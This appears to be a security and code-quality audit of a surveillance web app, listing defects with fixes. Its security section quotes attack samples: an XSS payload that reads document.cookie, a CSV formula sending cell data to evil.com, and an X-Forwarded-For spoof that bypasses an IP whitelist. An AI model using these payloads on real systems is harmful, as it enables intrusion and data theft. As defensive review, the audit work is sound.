1. Security & Authentication

CRITICAL
Live credentials committed to version control
.env.production
Secrets ▶

The .env.production file is committed to git and contains live Supabase project URL, anon key, and project ID. Anyone with repository access can read these credentials. The .gitignore lists .env files but the production variant is already tracked.

Impact: Full read access to the Supabase database using the anon key. If RLS policies are misconfigured, this grants access to all stored data including camera feeds, face recognition data, and user information.

Fix: Rotate all Supabase keys immediately. Remove the file from git history with git filter-branch or BFG Repo-Cleaner. Use CI/CD environment variables for production secrets.

CRITICAL
JWT signature never verified — forged tokens pass authentication
supabase/functions/_shared/auth.ts
Auth ▶

The verifyAuth function splits the JWT on ., base64-decodes the payload with atob(parts[1]), and parses it as JSON. It never verifies the cryptographic signature (parts[2]). Any attacker can craft a JWT with arbitrary claims and it will pass authentication. 

// Current broken code:
const parts = token.split('.');
const payload = JSON.parse(atob(parts[1]));
// Signature (parts[2]) is NEVER checked

Impact: Complete authentication bypass. Any user can impersonate any other user, gain admin access, or access any edge function.

Fix: Use jose or Supabase's built-in supabase.auth.getUser(token) to verify the JWT signature against the Supabase JWT secret.

CRITICAL
IP whitelist bypassable via X-Forwarded-For header spoofing
src/lib/ipUtils.ts
Network ▶

getClientIP unconditionally trusts client-supplied headers (X-Forwarded-For, X-Real-IP, CF-Connecting-IP). The first IP in the X-Forwarded-For chain is used, which is fully controlled by the client. An attacker can set X-Forwarded-For: 127.0.0.1 to bypass the entire IP whitelist.

Additionally, 0.0.0.0 is classified as localhost, and the IPv4 validator allows leading zeros (e.g., 0177.0.0.1) which can be used for octal bypass attacks.

Fix: Only trust proxy headers from known reverse proxies. Use the last IP in the chain (closest to the server), not the first. Remove 0.0.0.0 from localhost classification.

CRITICAL
Auth tokens stored unencrypted in localStorage
src/stores/authStore.ts
Auth ▶

Zustand's persist middleware stores raw access tokens and refresh tokens in localStorage under the key auth-store. This duplicates Supabase Auth SDK's own token storage and creates an additional attack surface for XSS-based token theft.

The isExpired() method uses Date.now() for token expiration, but the Supabase SDK already manages token refresh internally. This dual management can cause race conditions where one system refreshes while the other holds a stale token.

Fix: Remove the custom auth store entirely and rely on Supabase Auth SDK's built-in session management via supabase.auth.getSession() and onAuthStateChange.

CRITICAL
Client-side IP whitelist — entire middleware runs in the browser
src/middleware/ipWhitelist.ts
Auth ▶

The IP whitelist middleware is in src/ (bundled into the client-side app). All whitelist logic, admin IPs, blocked IPs, and dynamic add/remove/block functions execute in the browser where users can inspect and bypass them via DevTools.

The addToWhitelist, removeFromWhitelist, blockIP, and unblockIP functions mutate a module-level config object with no access control — any code in the bundle can call them. Changes are lost on page reload.

Additionally, the blocked-IP check runs before the admin-IP check, meaning an admin IP that gets added to the blocklist becomes permanently locked out.

Fix: Move IP filtering to server-side middleware (edge function, nginx, or reverse proxy). Remove client-side IP whitelist code entirely.

CRITICAL
SQL sanitization uses inadequate blocklist approach
src/lib/sanitization.ts
Injection ▶

sanitizeSql uses a regex blocklist to strip SQL keywords like DROP, DELETE, INSERT, UPDATE, etc. Blocklist-based SQL sanitization is fundamentally broken — it can be bypassed with Unicode homoglyphs, inline comments (/**/), alternate encodings, or creative casing. DOMPurify and sanitize-html are installed as npm dependencies but never imported anywhere in the source.

Fix: Use parameterized queries exclusively. Supabase client already provides this via .rpc() and query builders. Remove the sanitizeSql function entirely.

HIGH
Rate limiter has unbounded memory leak
src/middleware/rateLimit.ts
Memory ▶

The module-level requestCounts Map never evicts expired entries. Even when a record's resetAt time passes, the old entry stays in the Map until a new request from that same IP replaces it. Under scanning or distributed attacks, unique IPs accumulate indefinitely.

Fix: Add a periodic cleanup interval that removes expired entries. Better yet, move rate limiting to the server (nginx limit_req, Cloudflare, or edge function).

HIGH
CSRF protection absent — no token validation on state-changing requests
src/services/ (all API services)
CSRF ▶

No CSRF tokens are generated or validated anywhere in the application. All API calls use Bearer token auth in the Authorization header, which provides some protection since browsers don't auto-attach custom headers cross-origin. However, the Supabase client SDK stores the session in localStorage and attaches it automatically, which is vulnerable to XSS-based CSRF.

Fix: Implement the Synchronizer Token Pattern or Double Submit Cookie for state-changing operations. At minimum, validate the Origin/Referer headers on the server side.

HIGH
Docker container runs as root
Dockerfile
Infra ▶

The Dockerfile has no USER directive, so the application runs as root inside the container. If an attacker gains code execution (e.g., via dependency vulnerability), they have full root privileges inside the container and can attempt container escape.

Fix: Add RUN addgroup -S app && adduser -S app -G app and USER app before the CMD instruction. Also add a proper .dockerignore (currently effectively empty).

HIGH
Redis exposed without authentication
docker-compose.yml
Infra ▶

Redis is exposed on port 6379 to the host network with no password configured. MediaMTX streaming ports (RTSP 8554, RTMP 1935, HLS 8888, WebRTC 8889, API 9997) are also all exposed to the host without authentication.

Fix: Add --requirepass to Redis. Bind ports to 127.0.0.1 or use Docker internal networking. Add authentication to MediaMTX API.

HIGH
nginx CSP allows unsafe-inline and unsafe-eval
nginx.conf
Headers ▶

The Content-Security-Policy header includes 'unsafe-inline' and 'unsafe-eval', which effectively disables CSP protection against XSS. No HTTPS/SSL configuration is present. The Permissions-Policy blocks camera and microphone access, which contradicts the surveillance system's use case. Security headers are only set on the root location block — static assets served by other location blocks don't get them.

Fix: Remove 'unsafe-inline' and 'unsafe-eval' (use nonces or hashes). Add SSL/TLS configuration. Fix the Permissions-Policy for surveillance use case. Apply security headers to all location blocks.

HIGH
Edge function validation schemas allow unbounded input
supabase/functions/_shared/validation.ts
Validation ▶

Multiple Zod schemas define string fields with no .max() constraint. An attacker can send megabytes of data in any string field, consuming server memory and potentially causing OOM on the edge function. Phone numbers are validated only as z.string() with no format validation.

Fix: Add .max() constraints to all string fields. Use .regex() for phone numbers, emails, and other structured data.

HIGH
File validation allows unknown types and has incomplete WebP check
src/lib/file-validation.ts
Validation ▶

WebP validation only checks the RIFF prefix (bytes 0-3) but not the WEBP marker (bytes 8-11). An attacker can upload any RIFF-format file (WAV, AVI) and have it accepted as a valid WebP image. Unknown file types bypass validation entirely and return true.

Fix: Validate both RIFF prefix and WEBP marker bytes. Default unknown file types to false.

MEDIUM
Global trace ID race condition in fetcher
src/lib/fetcher.ts
Concurrency ▶

A global variable stores the current trace ID. When concurrent requests are in flight, they overwrite each other's trace IDs, corrupting distributed tracing correlation.

Fix: Generate a unique trace ID per request instead of using a shared global.

MEDIUM
stripHtml bypassable with malformed HTML
src/lib/sanitization.ts
XSS ▶

The custom stripHtml function uses a simple regex to remove tags. It can be bypassed with malformed HTML like <img src=x onerror=alert(1)//> or HTML entities. DOMPurify is installed but unused.

Fix: Use DOMPurify (already in dependencies) instead of the custom regex approach.

2. XSS & Injection

CRITICAL
XSS via popup.setHTML() with unsanitized camera data
src/components/CameraMap.tsx
XSS ▶

The Mapbox GL marker popup uses popup.setHTML() with unsanitized camera.name and camera.location values. If camera names are stored from user input or API responses, an attacker can inject arbitrary HTML/JavaScript via a camera name like <img src=x onerror=alert(document.cookie)>.

Fix: Use popup.setText() or sanitize with DOMPurify before passing to setHTML(). Alternatively, build DOM nodes and use popup.setDOMContent().

CRITICAL
XSS and formula injection in export utilities
src/lib/exportUtils.ts
XSS ▶

The HTML export function uses document.write() with unescaped database values to build table cells. Any stored XSS payload in database records will execute when the exported HTML file is opened.

The CSV export does not prefix values starting with =, +, -, or @ with a single quote. This allows CSV formula injection — when the exported CSV is opened in Excel/Sheets, formulas like =HYPERLINK("http://evil.com/steal?d="&A1) will execute.

Fix: HTML-escape all values in the HTML export. Prefix formula-triggering characters with a single quote in CSV export.

HIGH
Multiple components use dangerouslySetInnerHTML
Various components
XSS ▶

Several components across the codebase use dangerouslySetInnerHTML or create DOM elements with innerHTML from data that originates from user input or API responses without sanitization.

Fix: Audit all uses of dangerouslySetInnerHTML. Use DOMPurify (already installed) to sanitize any HTML content before rendering.

MEDIUM
Snapshot annotator renders unescaped text on canvas
src/lib/snapshotAnnotator.ts
XSS ▶

Canvas text rendering itself is safe from XSS, but the annotator exports results that are later used in HTML contexts (image annotations, overlay labels). If those labels contain HTML, they could be rendered unsafely downstream.

3. React Hooks & State Management

CRITICAL
Infinite re-render loop in useMediaMTX
src/hooks/useMediaMTX.ts
Hooks ▶

The fetchPaths function is called inside a useEffect that includes paths in its dependency array. Since fetchPaths sets paths state on every call (new array reference), this creates an infinite loop: effect fires → fetches → sets paths → dependency changes → effect fires again. 

useEffect(() => {
  fetchPaths(); // sets paths state
}, [paths]); // paths changes on every set → infinite loop

Fix: Remove paths from the dependency array. Use an interval or event-driven approach for periodic refresh.

CRITICAL
Stale closure allows unbounded concurrent face-detection API calls
src/hooks/useRealtimeRecognition.ts
Hooks ▶

The isProcessing ref check that gates face recognition API calls uses a stale closure. Multiple animation frames can pass the if (!isProcessing.current) check before the first call sets it to true, resulting in dozens of concurrent API calls to the face comparison edge function.

Impact: Excessive API costs, potential edge function rate limiting, and degraded face recognition accuracy from out-of-order results.

Fix: Use a synchronous flag or mutex pattern. Set isProcessing.current = true immediately before the async call, not inside the async callback.

CRITICAL
useSyncExternalStore snapshot creates new objects every call
src/hooks/useFrameBuffer.ts
Hooks ▶

The getSnapshot function passed to useSyncExternalStore returns a new object on every invocation. Since React uses Object.is to compare snapshots, this means every render sees a "new" snapshot and triggers a re-render, creating an infinite render loop or at minimum excessive renders.

Fix: Memoize the snapshot object. Only create a new object when the underlying data actually changes.

HIGH
Multiple context providers not memoized — cascading re-renders
src/contexts/*.tsx
Performance ▶

NotificationContext, AnalyticsContext, SettingsContext, and AuthContext all create their Provider value objects inline without useMemo. Every parent render creates a new value reference, causing all consumers to re-render even when the actual data hasn't changed. This cascades across the entire component tree.

Fix: Wrap all Provider value props in useMemo with appropriate dependency arrays.

HIGH
AppProviders component is dead code — error handling never mounts
src/providers/AppProviders.tsx, src/App.tsx
Architecture ▶

AppProviders.tsx wraps QueryProvider (with proper error handling config) and other providers, but it is never imported in App.tsx. Instead, App.tsx creates its own QueryClient with different defaults (staleTime 5min vs 1min) and no error boundaries. The well-configured error handling in QueryProvider is never used.

Fix: Use AppProviders in App.tsx and remove the duplicate QueryClient instantiation.

HIGH
useRecording missing cleanup on unmount
src/hooks/useRecording.ts
Hooks ▶

The recording hook starts an interval for periodic chunk uploads but never clears it on unmount. The stop function uses a stale closure over the interval ID. If the component unmounts while recording is active, the interval continues firing with stale references.

Fix: Return a cleanup function from the useEffect that clears the interval. Use a ref for the interval ID.

HIGH
Global volume slider has no effect
src/lib/alertSounds.ts
Feature ▶

The globalVolume variable is set when the volume slider changes, but it is never applied to any Audio element's .volume property. All alert sounds play at their default volume regardless of the user's setting.

Fix: Apply globalVolume to each Audio element before calling .play().

MEDIUM
Duplicate QueryClient with conflicting staleTime defaults
src/App.tsx vs src/providers/QueryProvider.tsx
Config ▶

App.tsx creates a QueryClient with staleTime: 5 * 60 * 1000 (5 minutes). QueryProvider.tsx (unused) creates one with staleTime: 1 * 60 * 1000 (1 minute). The active configuration uses the longer stale time, meaning data may be served stale for up to 5 minutes after fetching.

MEDIUM
PPE detection tracking cache grows unbounded
src/hooks/usePPEDetection.ts
Memory ▶

The trackingCache Map in the PPE detection hook accumulates entries for every detected person but never removes them. Stats (violations, compliant counts) accumulate monotonically and never reset. Over extended surveillance sessions, memory usage grows indefinitely.

Fix: Implement cache eviction based on time or maximum size. Add periodic stats reset.

4. AI/ML & Detection

CRITICAL
Face recognition matching always called with null — feature non-functional
src/hooks/useStreamFaceDetection.ts
Feature ▶

The matchFaceWithRegistered function is always invoked with null as the registered faces parameter. This means no face is ever matched against the registered face database, making the entire face recognition feature non-functional. Faces are detected but never identified. 

// The call site:
const match = matchFaceWithRegistered(descriptor, null);
// null means registeredFaces is empty → no match ever found

Impact: The core face recognition feature — a primary value proposition of the surveillance system — does not work at all.

Fix: Load registered faces from the database/store and pass them to matchFaceWithRegistered.

CRITICAL
Zone detection timeout math always equals zero
src/hooks/useZoneDetection.ts
Logic ▶

The lost-object detection calculates timeSinceUpdate = currentTime - enteredAt - (currentTime - enteredAt), which algebraically simplifies to 0. This means tracked objects are never considered "lost" and entries accumulate forever in the tracking Map. 

// Algebraic proof:
timeSinceUpdate = currentTime - enteredAt - (currentTime - enteredAt)
                = currentTime - enteredAt - currentTime + enteredAt
                = 0  // always zero!

Impact: Unbounded memory leak. Lost/abandoned object detection never triggers alerts. Over hours of operation, tracking data grows indefinitely.

Fix: Use timeSinceUpdate = currentTime - lastSeenAt where lastSeenAt is the last time the object was detected in a frame.

HIGH
PPE "hat" class never matches COCO-SSD output
src/hooks/ppe/usePPELocalML.ts
ML ▶

The helmet detection heuristic checks for the class "hat" in COCO-SSD detection results. However, "hat" is not a valid COCO-SSD class — the 80-class COCO dataset does not include "hat". The code falls back to position-based heuristics (checking if any object is above a person's head), which is unreliable.

Fix: Use a dedicated helmet/PPE detection model instead of repurposing COCO-SSD. Models like YOLOv8 with custom PPE training weights are available for TensorFlow.js.

HIGH
TensorFlow.js models loaded on main thread — blocks UI
src/hooks/useStreamFaceDetection.ts, src/hooks/ppe/
Performance ▶

All ML model loading and inference (face-api.js models, COCO-SSD, TensorFlow.js) runs on the main thread. Model loading can take several seconds and blocks the UI. Inference on each video frame also blocks rendering, causing frame drops and janky scrolling.

Fix: Move model loading and inference to a Web Worker. Use OffscreenCanvas for video frame processing in the worker.

MEDIUM
ALPR confidence threshold hardcoded with no calibration
src/hooks/useALPR.ts
Config ▶

The license plate recognition confidence threshold is hardcoded. Different camera angles, lighting conditions, and plate formats require different thresholds. No mechanism exists for per-camera calibration or adaptive thresholding.

MEDIUM
Face descriptor comparison uses Euclidean distance without normalization
src/hooks/useStreamFaceDetection.ts
ML ▶

Face descriptors are compared using raw Euclidean distance. Without L2 normalization of the descriptor vectors, the distance metric is scale-sensitive and can produce false matches/rejections depending on lighting and face angle.

5. Infrastructure & DevOps

CRITICAL
CD pipeline never fails — all steps have || true
.github/workflows/cd.yml
CI/CD ▶

Both the npm install and npm run build steps in the CD workflow have || true and continue-on-error: true. This means a build that fails with compilation errors or missing dependencies will still pass CI and proceed to deployment. Broken code can be deployed to production without any gate. 

# cd.yml
- run: npm install || true
  continue-on-error: true
- run: npm run build || true
  continue-on-error: true

Fix: Remove || true and continue-on-error: true from all build steps. Add test and lint steps that must pass before deployment.

HIGH
No health checks in Docker or Kubernetes configs
docker-compose.yml, Dockerfile
Infra ▶

Neither the Docker Compose configuration nor the Dockerfile defines health checks. If the application enters a degraded state (e.g., event loop stall, OOM), the container orchestrator cannot detect it and will not restart the container.

Fix: Add HEALTHCHECK directive to the Dockerfile and healthcheck to docker-compose.yml services.

HIGH
Kubernetes manifests reference non-existent secrets and configmaps
k8s/*.yaml
Infra ▶

Deployment manifests reference Kubernetes secrets and configmaps that are not defined in the repository. No documentation exists for required secret provisioning. Resource limits are either absent or set unrealistically low for ML inference workloads.

HIGH
Service worker (sw.js) caches everything indefinitely
public/sw.js
PWA ▶

The hand-written service worker uses a cache-first strategy with no cache invalidation. Once a resource is cached, it is served from cache forever, even after a new deployment. Users can get stuck on stale versions of the application. No version management or cache-busting strategy is implemented.

Fix: Implement a cache versioning strategy with a CACHE_VERSION constant. Clear old caches in the activate event. Use network-first for API requests and cache-first only for immutable assets (hashed filenames).

MEDIUM
.dockerignore effectively empty
.dockerignore
Infra ▶

The .dockerignore file exists but excludes very little. The entire node_modules, .git directory, test files, and development configs are included in the Docker build context, significantly increasing build time and image size.

Fix: Add node_modules, .git, *.md, tests/, .env*, and other development-only files to .dockerignore.

MEDIUM
No environment-specific configuration management
src/config/
Config ▶

Configuration values (API URLs, feature flags, timeouts) are hardcoded or only differentiated via the committed .env.production file. No staging environment configuration exists. Development and production share the same defaults.

6. Video Streaming

HIGH
HLS.js error recovery lacks retry limit
src/hooks/useHLSStream.ts
Streaming ▶

The HLS error handler calls hls.recoverMediaError() and hls.startLoad() on every error with no retry counter. If a stream is permanently unavailable, the hook enters an infinite error-recovery loop, consuming CPU and generating network traffic indefinitely.

Fix: Add a retry counter. After N consecutive failures, stop recovery and show a "stream unavailable" message.

HIGH
Multiple WebRTC peer connections leak on camera switch
src/hooks/useWebRTCStream.ts
Memory ▶

When switching cameras, a new RTCPeerConnection is created but the previous one is not always properly closed. The cleanup function in useEffect only runs on unmount, not on camera ID changes. This leaks peer connections, ICE candidates, and associated media tracks.

Fix: Close the previous peer connection when the camera ID changes, not just on unmount. Include the camera ID in the useEffect dependency array.

MEDIUM
MediaMTX API calls have no authentication
src/hooks/useMediaMTX.ts
Auth ▶

All fetch calls to the MediaMTX API (/v3/paths, etc.) include no authentication headers. The MediaMTX API port is exposed to the host network. Anyone who can reach the API can list, add, or remove streams.

MEDIUM
Video canvas not cleaned up when stream ends
src/components/VideoPlayer.tsx
Memory ▶

When a video stream ends or errors out, the canvas element retains the last frame and associated GPU memory. The requestAnimationFrame loop continues running even after the video source has stopped, wasting CPU cycles.

7. API & Data Layer

HIGH
Offline sync with IndexedDB has no conflict resolution
src/lib/offlineSync.ts
Data ▶

The offline sync mechanism queues mutations in IndexedDB and replays them when connectivity is restored. However, there is no conflict resolution strategy — if the same record was modified on the server while the client was offline, the last-write-wins approach can silently overwrite important data. No retry logic for failed sync operations.

HIGH
Supabase realtime subscriptions leak on component remount
src/hooks/useSupabaseRealtime.ts
Memory ▶

Realtime channel subscriptions are created in useEffect but the cleanup function does not always unsubscribe properly. React 18's StrictMode double-mount in development creates duplicate subscriptions. In production, fast navigation between pages can accumulate dangling channel subscriptions that receive events but whose handlers reference unmounted components.

MEDIUM
API error responses expose internal details
src/middleware/validation.ts, src/middleware/errorHandler.ts
Security ▶

The validation middleware returns raw ZodError objects to the client, exposing internal schema structure. The error handler returns a generic "Internal Server Error" with no request correlation. Neither provides useful error context for debugging while keeping sensitive details hidden.

MEDIUM
Triple realtime integration (Socket.io + Ably + Pusher) with no fallback strategy
src/lib/ably.ts, src/lib/pusher.ts, src/services/socket.ts
Architecture ▶

Three different realtime communication libraries (Socket.io, Ably, Pusher) are configured in parallel. There is no fallback chain or load balancing between them. It is unclear which one is the primary transport. Configuration for all three is required but there is no health-check or automatic failover between them.

8. State Duplication & Architecture

HIGH
Theme state managed in 3 places simultaneously
src/stores/themeStore.ts, src/providers/ThemeProvider.tsx, src/types/
Architecture ▶

Theme state exists in a Zustand store (themeStore), a React context (ThemeProvider), and is also typed in the types directory. Components may read from different sources, leading to inconsistent theming. Changes to one source may not propagate to the others.

Fix: Choose one source of truth (Zustand store recommended) and derive all other access from it.

HIGH
Notification state managed in 3 places simultaneously
src/stores/notificationStore.ts, src/contexts/NotificationContext.tsx, src/hooks/useNotifications.ts
Architecture ▶

Notifications exist in a Zustand store, a React context, and a custom hook that may or may not read from either. Components calling useNotifications() may get different data depending on which source they end up reading from. Adding a notification in one source does not appear in the other.

HIGH
Settings state managed in 3 places simultaneously
src/stores/settingsStore.ts, src/contexts/SettingsContext.tsx, src/hooks/useSettings.ts
Architecture ▶

Same pattern as theme and notifications — settings exist in a Zustand store, a React context, and a hook. Changing a setting via the store does not update the context and vice versa.

HIGH
Auth/User state managed in 4 places simultaneously
src/stores/authStore.ts, src/stores/userStore.ts, src/contexts/AuthContext.tsx, src/contexts/UserContext.tsx
Architecture ▶

Authentication and user state is the worst offender: two Zustand stores (authStore, userStore) and two React contexts (AuthContext, UserContext) all hold user identity and authentication state. Add Supabase Auth SDK's own state management and this becomes five overlapping sources of truth for the same data.

Fix: Consolidate to a single source: use supabase.auth.onAuthStateChange() as the sole provider, wrapping it in one context or store that all components consume.

MEDIUM
Large number of Zustand stores with persist — localStorage bloat
src/stores/*.ts
Performance ▶

Multiple Zustand stores use the persist middleware, each writing to localStorage. The combined data (auth tokens, user data, settings, theme, notifications, camera configs, detection results) can grow beyond localStorage's ~5MB limit and cause silent data loss.
